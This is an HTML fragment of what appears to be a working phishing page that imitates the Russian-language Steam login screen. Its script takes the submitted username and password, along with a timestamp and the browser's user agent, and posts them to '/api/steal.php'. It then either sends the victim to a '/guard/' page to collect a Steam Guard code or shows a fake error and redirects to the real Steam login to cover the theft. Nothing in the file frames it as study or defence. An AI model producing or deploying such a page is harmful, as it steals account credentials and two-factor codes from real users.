    <title>Вход в Steam</title>
    <link rel="stylesheet" href="style.css">
    <style>
        .login-box {
            width: 300px;
            margin: 50px auto;
            background: #1b2838;
            padding: 30px;
            border-radius: 3px;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #2a475e;
            border: 1px solid #000;
            color: white;
            border-radius: 2px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #5c7e10;
            color: white;
            border: none;
            border-radius: 2px;
            cursor: pointer;
            font-size: 16px;
        }
        .steam-guard-link {
            text-align: center;
            margin-top: 15px;
        }
        .error {
            color: #ff4747;
            font-size: 12px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2 style="text-align: center;">Вход в Steam</h2>
        
        <div id="errorMessage" class="error">Неверное имя пользователя или пароль</div>
        
        <form id="loginForm">
            <input type="text" id="username" 
                   placeholder="Имя пользователя" required>
            
            <input type="password" id="password" 
                   placeholder="Пароль" required>
            
            <div style="font-size: 12px; margin: 10px 0;">
                <input type="checkbox" id="remember"> Запомнить меня
            </div>
            
            <button type="submit">Войти</button>
        </form>
        
        <div class="steam-guard-link">
            <a href="/guard/" style="color: #66c0f4; text-decoration: none;">
                Войти с помощью Steam Guard
            </a>
        </div>
        
        <div style="text-align: center; margin-top: 20px; font-size: 12px;">
            <a href="#" style="color: #66c0f4;">Забыли пароль?</a> | 
            <a href="#" style="color: #66c0f4;">Создать аккаунт</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').onsubmit = function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Показываем "загрузку"
            document.querySelector('button').textContent = 'Проверка...';
            
            // Отправляем на наш сервер
            fetch('/api/steal.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'steam_login',
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent
                })
            });
            
            // Имитируем проверку (2 секунды)
            setTimeout(() => {
                // Если Steam Guard включен - просим код
                if (Math.random() > 0.3) { // 70% случаев
                    window.location.href = '/guard/';
                } else {
                    // Иначе показываем "ошибку"
                    document.getElementById('errorMessage').style.display = 'block';
                    document.querySelector('button').textContent = 'Войти';
                    
                    // Через 3 секунды редирект на настоящий Steam
                    setTimeout(() => {
                        window.location.href = 'https://store.steampowered.com/login';
                    }, 3000);
                }
            }, 2000);
            
            return false;
        };
    </script>
</body>
</html>
